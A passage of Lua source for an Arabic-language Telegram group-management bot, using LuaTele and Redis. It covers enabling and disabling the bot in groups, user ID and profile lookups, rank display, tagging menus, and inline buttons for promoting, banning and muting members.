return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تفعيلها مسبقا*',"md",true)  
else
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'رفع الادمنيه', data = msg.sender.user_id..'/addAdmins@'..msg_chat_id},
},
{
{text = 'قفل جميع الاوامر ', data =msg.sender.user_id..'/LockAllGroup@'..msg_chat_id},
},
}
}
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
break
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'مغادرة الكروب ', data = '/leftgroup@'..msg_chat_id}, 
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
LuaTele.sendText(Sudo_Id,0,'*\n• تم تفعيل كروب جديده \n• من قام بتفعيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n• معلومات الكروب :\n• عدد الاعضاء : '..Info_Chats.member_count..'\n• عدد الادمنيه : '..Info_Chats.administrator_count..'\n• عدد المطرودين : '..Info_Chats.banned_count..'\n• عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
Redis:sadd(LaRiCa.."ChekBotAdd",msg_chat_id)
Redis:set(LaRiCa.."Status:Id"..msg_chat_id,true) ;Redis:del(LaRiCa.."Status:Reply"..msg_chat_id) ;Redis:del(LaRiCa.."Status:ReplySudo"..msg_chat_id) ;Redis:set(LaRiCa.."Status:BanId"..msg_chat_id,true) ;Redis:set(LaRiCa.."Status:SetId"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تفعيل الكروب*','md', true, false, false, false, reply_markup)
end
end 
if text == 'تفعيل' and not msg.Dev then
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
local AddedBot = true
elseif (StatusMember == "chatMemberStatusAdministrator") then
local AddedBot = true
else
local AddedBot = false
end
if AddedBot == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرا انته لست ادمن او مالك الكروب*","md",true)  
end
if not Redis:get(LaRiCa.."BotFree") then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• الوضع الخدمي تم تعطيله من قبل مطور البوت*","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if Redis:sismember(LaRiCa.."ChekBotAdd",msg_chat_id) then
if tonumber(Info_Chats.member_count) < tonumber((Redis:get(LaRiCa..'Num:Add:Bot') or 0)) and not msg.ControllerBot then
return LuaTele.sendText(msg_chat_id,msg_id,'• عدد الاعضاء قليل لا يمكن تفعيل الكروب  يجب ان يكوم اكثر من :'..Redis:get(LaRiCa..'Num:Add:Bot'),"md",true)  
end
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تفعيلها مسبقا*',"md",true)  
else
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
break
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'مغادرة الكروب ', data = '/leftgroup@'..msg_chat_id}, 
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
LuaTele.sendText(Sudo_Id,0,'*\n• تم تفعيل كروب جديده \n• من قام بتفعيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n• معلومات الكروب :\n• عدد الاعضاء : '..Info_Chats.member_count..'\n• عدد الادمنيه : '..Info_Chats.administrator_count..'\n• عدد المطرودين : '..Info_Chats.banned_count..'\n• عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'رفع الادمنيه', data = msg.sender.user_id..'/addAdmins@'..msg_chat_id},
},
{
{text = 'قفل جميع الاوامر ', data =msg.sender.user_id..'/LockAllGroup@'..msg_chat_id},
},
}
}
Redis:sadd(LaRiCa.."ChekBotAdd",msg_chat_id)
Redis:set(LaRiCa.."Status:Id"..msg_chat_id,true) ;Redis:del(LaRiCa.."Status:Reply"..msg_chat_id) ;Redis:del(LaRiCa.."Status:ReplySudo"..msg_chat_id) ;Redis:set(LaRiCa.."Status:BanId"..msg_chat_id,true) ;Redis:set(LaRiCa.."Status:SetId"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تفعيل الكروب*','md', true, false, false, false, reply_markup)
end
end

if text == 'تعطيل'  then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• هذا الامر يخص المطور فقط *","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if not Redis:sismember(LaRiCa.."ChekBotAdd",msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تعطيلها مسبقا*',"md",true)  
else
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
break
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
LuaTele.sendText(Sudo_Id,0,'*\n• تم تعطيل كروب جديده \n• من قام بتعطيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n• معلومات الكروب :\n• عدد الاعضاء : '..Info_Chats.member_count..'\n• عدد الادمنيه : '..Info_Chats.administrator_count..'\n• عدد المطرودين : '..Info_Chats.banned_count..'\n• عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
Redis:srem(LaRiCa.."ChekBotAdd",msg_chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تعطيلها بنجاح*','md',true)
end
end
if text == 'تعطيل'  then
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• هذا الامر يخص المطور فقط *","md",true)  
end
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
local AddedBot = true
elseif (StatusMember == "chatMemberStatusAdministrator") then
local AddedBot = true
else
local AddedBot = false
end
if AddedBot == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرا انته لست ادمن او مالك الكروب*","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
if not Redis:sismember(LaRiCa.."ChekBotAdd",msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تعطيلها مسبقا*',"md",true)  
else
if not msg.ControllerBot then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
break
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
LuaTele.sendText(Sudo_Id,0,'*\n• تم تعطيل كروب جديده \n• من قام بتعطيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n• معلومات الكروب :\n• عدد الاعضاء : '..Info_Chats.member_count..'\n• عدد الادمنيه : '..Info_Chats.administrator_count..'\n• عدد المطرودين : '..Info_Chats.banned_count..'\n• عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
end
Redis:srem(LaRiCa.."ChekBotAdd",msg_chat_id)
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n• تم تعطيلها بنجاح*','md',true)
end
end
if chat_type(msg.chat_id) == "GroupBot" and Redis:sismember(LaRiCa.."ChekBotAdd",msg_chat_id) then
if text == 'ايدي' then
if msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else UserInfousername = 'لا يوجد'
end
local UserId = Message_Reply.sender.user_id
local U = LuaTele.getUser(UserId)
local Nn = U.first_name
local RinkBot = Controller(msg_chat_id,UserId)
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(LaRiCa.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(LaRiCa.."Num:Add:Games"..msg.chat_id..UserId) or 0
if id3am then
local id3am = id3am:gsub('#AddMem',NumAdd) 
local id3am = id3am:gsub('#id',UserId) 
local id3am = id3am:gsub('#username',UserInfousername) 
local id3am = id3am:gsub('#msgs',TotalMsg) 
local id3am = id3am:gsub('#edit',TotalEdit) 
local id3am = id3am:gsub('#stast',RinkBot) 
local id3am = id3am:gsub('#auto',TotalMsgT)  
local id3am = id3am:gsub('#game',NumberGames) 
LuaTele.sendText(msg_chat_id,msg_id,id3am,"md",true) 
else
LuaTele.sendText(msg_chat_id,msg_id,'\n⌔︰ID  ˓   '..UserId..'\n⌔︰User  ˓   ['..UserInfousername..']'..'\n⌔︰Rink  ˓   '..RinkBot..'\n⌔︰Msgs  ˓  '..TotalMsg..'\n⌔︰Edits  ˓  '..TotalEdit..'\n⌔︰Active  ˓  '..TotalMsgT..'',"md",true) 
end end end
if text == "ايدي" or text =='id' or text =='Id' or text == 'ID' then 
if msg.reply_to_message_id == 0 then
if not Redis:get(LaRiCa.."Status:Id"..msg_chat_id) then
return false
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local Name_User = UserInfo.first_name
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
local UserId = msg.sender.user_id
local RinkBot = msg.Name_Controller
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalPhoto = photo.total_count or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumberGames = Redis:get(LaRiCa.."Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
local NumAdd = Redis:get(LaRiCa.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0
local Texting = { "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻",  "𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻"}
local Description = Texting[math.random(#Texting)]
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else UserInfousername = 'لا يوجد'
end
Get_Is_Id = Redis:get(LaRiCa.."Set:Id:Group"..msg_chat_id) or Redis:get(LaRiCa.."Set:Id:Groups")
if Redis:get(LaRiCa.."Status:IdPhoto"..msg_chat_id) then
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#name',Name_User) 
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',msg.sender.user_id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserInfousername) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',TotalPhoto) 
local Get_Is_Id = Get_Is_Id:gsub('#bio',getbio(UserId)) 
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,Get_Is_Id)
else
return LuaTele.sendText(msg_chat_id,msg_id,Get_Is_Id,"md",true) 
end
else
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,Description..'\n⌔︰ID  ˓   '..UserId..'\n⌔︰User  ˓   ['..UserInfousername..']'..'\n⌔︰Rink  ˓   '..RinkBot..'\n⌔︰Photos  ˓  '..TotalPhoto..'\n⌔︰Msgs  ˓  '..TotalMsg..'\n⌔︰Edits  ˓  '..TotalEdit..'\n⌔︰Active  ˓  '..TotalMsgT..'\n⌔︰Bio  ˓  *'..getbio(UserId)..'*'..'', "md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'⌔︰User  ˓   ['..UserInfousername..']'..'\n⌔︰Rink  ˓   '..RinkBot..'\n⌔︰ID  ˓   '..UserId..'\n⌔︰Photos  ˓  '..TotalPhoto..'\n⌔︰Msgs  ˓  '..TotalMsg..'\n⌔︰Edits  ˓  '..TotalEdit..'\n⌔︰Active  ˓  '..TotalMsgT..'\n⌔︰Bio  ˓  *'..getbio(UserId)..'*'..'',"md",true) 
end end
else
if Get_Is_Id then
local Get_Is_Id = Get_Is_Id:gsub('#name',Name_User) 
local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
local Get_Is_Id = Get_Is_Id:gsub('#id',msg.sender.user_id) 
local Get_Is_Id = Get_Is_Id:gsub('#username',UserInfousername) 
local Get_Is_Id = Get_Is_Id:gsub('#msgs',TotalMsg) 
local Get_Is_Id = Get_Is_Id:gsub('#edit',TotalEdit) 
local Get_Is_Id = Get_Is_Id:gsub('#stast',RinkBot) 
local Get_Is_Id = Get_Is_Id:gsub('#auto',TotalMsgT) 
local Get_Is_Id = Get_Is_Id:gsub('#Description',Description) 
local Get_Is_Id = Get_Is_Id:gsub('#game',NumberGames) 
local Get_Is_Id = Get_Is_Id:gsub('#photos',TotalPhoto) 
local Get_Is_Id = Get_Is_Id:gsub('#bio',getbio(UserId)) 
return LuaTele.sendText(msg_chat_id,msg_id,'['..Get_Is_Id..']',"md",true) 
else
return LuaTele.sendText(msg_chat_id,msg_id,'⌔︰ID  ˓   '..UserId..'\n⌔︰User  ˓   ['..UserInfousername..']'..'\n⌔︰Rink  ˓   '..RinkBot..'\n⌔︰Msgs  ˓  '..TotalMsg..'\n⌔︰Edits  ˓  '..TotalEdit..'\n⌔︰Active  ˓  '..TotalMsgT..'\n⌔︰Bio  ˓  *'..getbio(UserId)..'*'..'',"md",true) 
end end end end
if text == 'كشف' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
local UserId = Message_Reply.sender.user_id
local InfoUser = LuaTele.getUserFullInfo(UserId)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local RinkBot = Controller(msg_chat_id,Message_Reply.sender.user_id)
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..Message_Reply.sender.user_id) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..Message_Reply.sender.user_id) or 0
local TotalMsgT = Total_message(TotalMsg) 
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⌔︰ID  ˓  '..UserId..
'\n⌔︰User Name  ˓  '..UserInfousername..
'\n⌔︰Rink  ˓  '..RinkBot..
'\n⌔︰Msg  ˓  '..TotalMsg..
'\n⌔︰Edit  ˓  '..TotalEdit..
'\n⌔︰Bio  ˓  '..Bio..
'',"md",true) 
end

if text and text:match('^ايدي @(%S+)$') or text and text:match('^كشف @(%S+)$') then
local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او قروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local UserId = UserId_Info.id
local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local RinkBot = Controller(msg_chat_id,UserId_Info.id)
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..UserId_Info.id) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..UserId_Info.id) or 0
local TotalMsgT = Total_message(TotalMsg) 
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⌔︰ID  ˓  '..UserId..
'\n⌔︰User Name  ˓  @'..UserName..
'\n⌔︰Rink  ˓  '..RinkBot..
'\n⌔︰Msg  ˓  '..TotalMsg..
'\n⌔︰Edit  ˓  '..TotalEdit..
'\n⌔︰Bio  ˓  '..Bio..
'',"md",true) 
end

if text and text:match('^كشف (%d+)$') then
local UserId = text:match('^كشف (%d+)$')
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.username then
UserName = '@'..UserInfo.username..''
else
UserName = 'لا يوجد'
end
local RinkBot = Controller(msg_chat_id,UserId)
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..UserId) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..UserId) or 0
local TotalMsgT = Total_message(TotalMsg) 
local NumAdd = Redis:get(LaRiCa.."Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
local NumberGames = Redis:get(LaRiCa.."Num:Add:Games"..msg.chat_id..UserId) or 0
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⌔︰ID  ˓  '..UserId..
'\n⌔︰User Name  ˓  @'..UserName..
'\n⌔︰Rink  ˓  '..RinkBot..
'\n⌔︰Msg  ˓  '..TotalMsg..
'\n⌔︰Edit  ˓  '..TotalEdit..
'\n⌔︰Bio  ˓  '..Bio..
'',"md",true) 
end
if text and text:match('^كشف @(%S+)$') or text and text:match('^كشف @(%S+)$') then
local UserName = text:match('^كشف @(%S+)$') or text:match('^كشف @(%S+)$')
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او قروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local UserId = UserId_Info.id
local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local RinkBot = Controller(msg_chat_id,UserId_Info.id)
local TotalMsg = Redis:get(LaRiCa..'Num:Message:User'..msg_chat_id..':'..UserId_Info.id) or 0
local TotalEdit = Redis:get(LaRiCa..'Num:Message:Edit'..msg_chat_id..UserId_Info.id) or 0
local TotalMsgT = Total_message(TotalMsg) 
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⌔︰ID  ˓  '..UserId..
'\n⌔︰User Name  ˓  @'..UserName..
'\n⌔︰Rink  ˓  '..RinkBot..
'\n⌔︰Msg  ˓  '..TotalMsg..
'\n⌔︰Edit  ˓  '..TotalEdit..
'\n⌔︰Bio  ˓  '..Bio..
'',"md",true) 
end
if text == 'رتبتي' then
local Jabwa = LuaTele.getUser(msg.sender.user_id)
local news = '• رتبتك : '..msg.Name_Controller
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = Jabwa.first_name, url = "https://t.me/"..Jabwa.username..""}, },}}
return LuaTele.sendText(msg_chat_id, msg_id, news, 'md', false, false, false, false, reply_markup)
end
if text == 'اسمي' then
local Jabwa = LuaTele.getUser(msg.sender.user_id)
if Jabwa.first_name then
news = " "..Jabwa.first_name.." "
else
news = " لا يوجد"
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = Jabwa.first_name, url = "https://t.me/"..Jabwa.username..""}, },}}
return LuaTele.sendText(msg_chat_id, msg_id, 'اسمك : '..news, 'md', false, false, false, false, reply_markup)
end
if text == 'الرتبه' and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.username then
UserInfousername = '@'..UserInfo.username..''
else
UserInfousername = 'لا يوجد'
end
local UserId = Message_Reply.sender.user_id
local InfoUser = LuaTele.getUserFullInfo(UserId)
local RinkBot = Controller(msg_chat_id,Message_Reply.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,
'\n⌔︰ID  ˓  '..UserId..
'\n⌔︰User Name  ˓  '..UserInfousername..
'\n⌔︰Rink  ˓  '..RinkBot..
'',"html",true) 
end
----تيست-تاك-----
if text == 'تاك' or text == 'تاج' then
local vip = Redis:smembers(LaRiCa.."Special:Group"..msg_chat_id) 
local admin = Redis:smembers(LaRiCa.."Admin:Group"..msg_chat_id) 
local manger = Redis:smembers(LaRiCa.."Manger:Group"..msg_chat_id) 
local creator = Redis:smembers(LaRiCa.."Creator:Group"..msg_chat_id) 
local basiccreator = Redis:smembers(LaRiCa.."Supcreator:Group"..msg_chat_id) 
local owner = Redis:smembers(LaRiCa.."Owners:Group"..msg_chat_id) 
local dev = Redis:smembers(LaRiCa.."Dev:Groups") 
local devss = Redis:smembers(LaRiCa.."Devss:Groups") 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '• للثانويين '..#devss..' ', data = msg.sender.user_id..'/tag/devss'},{text = '• للمطورين '..#dev..' ', data = msg.sender.user_id..'/tag/dev'},},
{{text = '• للمالكين '..#owner..' ', data = msg.sender.user_id..'/tag/owners'},{text = '• للاساسيين '..#basiccreator..' ', data = msg.sender.user_id..'/tag/basiccreator'},},
{{text = '• للمنشئين '..#creator..' ', data = msg.sender.user_id..'/tag/creator'},},
{{text = '• للمدراء '..#manger..' ', data = msg.sender.user_id..'/tag/manger'},{text = '• للادمنيه '..#admin..' ', data = msg.sender.user_id..'/tag/admin'},},
{{text = '• للميزين '..#vip..' ', data = msg.sender.user_id..'/tag/vip'},},
}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• مرحبا يمكنك عمل تاك للرتب عن طريق الازرار بالاسفل*',"md",false, false, false, false, reply_markup)
end
----تاك-----
if text and text:match('^تحكم @(%S+)$') then
local UserName = text:match('^تحكم @(%S+)$') 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•هذا الامر يخص ( '..Controller_Num(7)..' )* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n•عذرآ لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n•عذرآ لا تستطيع استخدام معرف قناة او قروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n•عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
TheBasics = Redis:sismember(LaRiCa.."Supcreator:Group"..msg.chat_id,UserId_Info.id) 
Originators = Redis:sismember(LaRiCa.."Creator:Group"..msg.chat_id,UserId_Info.id)
Managers = Redis:sismember(LaRiCa.."Manger:Group"..msg.chat_id,UserId_Info.id)
Addictive = Redis:sismember(LaRiCa.."Admin:Group"..msg.chat_id,UserId_Info.id)
Distinguished = Redis:sismember(LaRiCa.."Special:Group"..msg.chat_id,UserId_Info.id)
BanGroup = Redis:sismember(LaRiCa.."BanGroup:Group"..msg.chat_id,UserId_Info.id)
SilentGroup = Redis:sismember(LaRiCa.."SilentGroup:Group"..msg.chat_id,UserId_Info.id)
if BanGroup then
BanGroupz = "✓"
else
BanGroupz = "✗"
end
if SilentGroup then
SilentGroupz = "✓"
else
SilentGroupz = "✗"
end
if TheBasics then
TheBasicsz = "✓"
else
TheBasicsz = "✗"
end
if Originators then
Originatorsz = "✓"
else
Originatorsz = "✗"
end
if Managers then
Managersz = "✓"
else
Managersz = "✗"
end
if Addictive then
Addictivez = "✓"
else
Addictivez = "✗"
end
if Distinguished then
Distinguishedz = "✓"
else
Distinguishedz = "✗"
end

local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'رفع منشئ اساسي : '..TheBasicsz, data =msg.sender.user_id..'/statusTheBasicsz/'..UserId_Info.id},{text = 'رفع منشئ : '..Originatorsz, data =msg.sender.user_id..'/statusOriginatorsz/'..UserId_Info.id},
},
{
{text = 'رفع مدير : '..Managersz, data =msg.sender.user_id..'/statusManagersz/'..UserId_Info.id},{text = 'رفع ادمن : '..Addictivez, data =msg.sender.user_id..'/statusAddictivez/'..UserId_Info.id},
},
{
{text = 'رفع مميز : '..Distinguishedz, data =msg.sender.user_id..'/statusDistinguishedz/'..UserId_Info.id},
},
{
{text = 'حظر العضو : '..BanGroupz, data =msg.sender.user_id..'/statusban/'..UserId_Info.id},{text = 'كتم العضو : '..SilentGroupz, data =msg.sender.user_id..'/statusktm/'..UserId_Info.id},
},
{
{text = 'تنزيل الرتب : ', data =msg.sender.user_id..'/statusmem/'..UserId_Info.id},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data ='/delAmr1'}
}
}
}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• يمكنك تحكم بالعضو عن طريق الازرار \n تعني ان معه الرتبه : ✓ \nتعني انه ليس معه رتبه : ✗*',"md",false, false, false, false, reply_markup)
end

if text == 'تحكم' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*•هذا الامر يخص ( '..Controller_Num(7)..' )* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
TheBasics = Redis:sismember(LaRiCa.."Supcreator:Group"..msg.chat_id,Message_Reply.sender.user_id) 
Originators = Redis:sismember(LaRiCa.."Creator:Group"..msg.chat_id,Message_Reply.sender.user_id)
Managers = Redis:sismember(LaRiCa.."Manger:Group"..msg.chat_id,Message_Reply.sender.user_id)
